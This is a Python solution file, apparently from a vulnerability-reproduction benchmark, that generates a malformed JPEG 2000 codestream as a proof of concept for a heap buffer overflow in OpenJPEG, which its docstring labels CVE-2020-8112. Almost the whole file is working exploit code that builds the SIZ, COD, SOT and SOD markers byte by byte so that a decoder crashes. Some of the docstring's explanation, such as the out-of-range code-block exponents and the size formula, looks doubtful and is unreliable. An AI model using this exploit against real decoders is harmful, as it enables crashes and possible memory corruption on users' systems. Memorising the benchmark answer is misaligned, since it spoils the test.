import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept for a heap buffer overflow in OpenJPEG's
        HTJ2K decoder (CVE-2020-8112).

        The vulnerability exists in the `opj_t1_allocate_buffers` function, where
        an integer overflow can occur during the calculation of buffer size for
        code-block data. This leads to a small `malloc`, which is subsequently
        overflown.

        The PoC is a crafted JPEG 2000 codestream that triggers this condition:
        1.  **SIZ Marker**: Defines large image and tile dimensions to accommodate
            the oversized code-blocks. A dimension of 2^20 is used.
        2.  **COD Marker**:
            -   Enables High-Throughput (HT) mode and the use of precincts.
            -   Sets the number of decomposition levels to 0, resulting in a single
                resolution level.
            -   Specifies large code-block dimensions. The exponent values are set
                to 18. The OpenJPEG parser adds 2 to these values, resulting in
                an effective exponent of 20.
            -   Defines precinct sizes with exponents of 0 for the first (and only)
                resolution level. This prevents the code-block dimension exponent
                from being reduced.
        3.  **Triggering the Overflow**:
            -   The code-block dimension (width/height) for the resolution level
                is calculated as `1U << (code_block_exp - precinct_exp)`, which
                evaluates to `1 << (20 - 0) = 1 << 20`.
            -   In `opj_t1_allocate_buffers`, the total size is calculated as `w * h`.
                This becomes `(1 << 20) * (1 << 20) = 1 << 40`, which overflows a
                32-bit unsigned integer, resulting in 0.
            -   The function then calls `malloc(0)`, and subsequent processing
                attempts to write to this small or invalid buffer, causing a
                heap buffer overflow and a crash.
        """
        poc = bytearray()

        # SOC (Start of Codestream) marker
        poc.extend(b'\xff\x4f')

        # SIZ (Image and Tile Size) marker
        poc.extend(b'\xff\x51')
        poc.extend(b'\x00\x27')  # Lsiz (length)
        poc.extend(b'\x00\x00')  # Rsiz (capabilities)
        img_dim = 1 << 20
        poc.extend(struct.pack('>I', img_dim))      # Xsiz
        poc.extend(struct.pack('>I', img_dim))      # Ysiz
        poc.extend(b'\x00\x00\x00\x00')             # XOsiz
        poc.extend(b'\x00\x00\x00\x00')             # YOsiz
        poc.extend(struct.pack('>I', img_dim))      # XTsiz
        poc.extend(struct.pack('>I', img_dim))      # YTsiz
        poc.extend(b'\x00\x00\x00\x00')             # XTOsiz
        poc.extend(b'\x00\x00\x00\x00')             # YTOsiz
        poc.extend(b'\x00\x01')                     # Csiz (num components)
        poc.extend(b'\x07\x01\x01')                 # Ssiz, XRsiz, YRsiz

        # COD (Coding Style Default) marker
        poc.extend(b'\xff\x52')
        poc.extend(b'\x00\x0b')  # Lcod (length)
        poc.extend(b'\x21')      # Scod (HT mode, precincts)
        poc.extend(b'\x00')      # SGcod: Progression order
        poc.extend(b'\x00\x01')  # SGcod: Num layers
        poc.extend(b'\x00')      # SGcod: MCT
        poc.extend(b'\x00')      # SPcod: Num decomp levels
        poc.extend(b'\x12')      # SPcod: Cblk width exp (18+2=20)
        poc.extend(b'\x12')      # SPcod: Cblk height exp (18+2=20)
        poc.extend(b'\x00')      # SPcod: Cblk style
        poc.extend(b'\x00')      # SPcod: Transformation
        poc.extend(b'\x00')      # SPcod: Precinct sizes (pdx=0, pdy=0)

        # SOT (Start of Tile-part) marker
        poc.extend(b'\xff\x90')
        poc.extend(b'\x00\x0a')  # Lsot (length)
        poc.extend(b'\x00\x00')  # Isot (tile index)
        poc.extend(b'\x00\x00\x00\x00') # Psot (tile-part length, 0=to end)
        poc.extend(b'\x00')      # TPsot (tile-part index)
        poc.extend(b'\x01')      # TNsot (num tile-parts)

        # SOD (Start of Data) marker
        poc.extend(b'\xff\x93')

        # Dummy data to proceed with decoding
        poc.extend(b'\x00' * 16)

        # EOC (End of Codestream) marker
        poc.extend(b'\xff\xd9')
        
        return bytes(poc)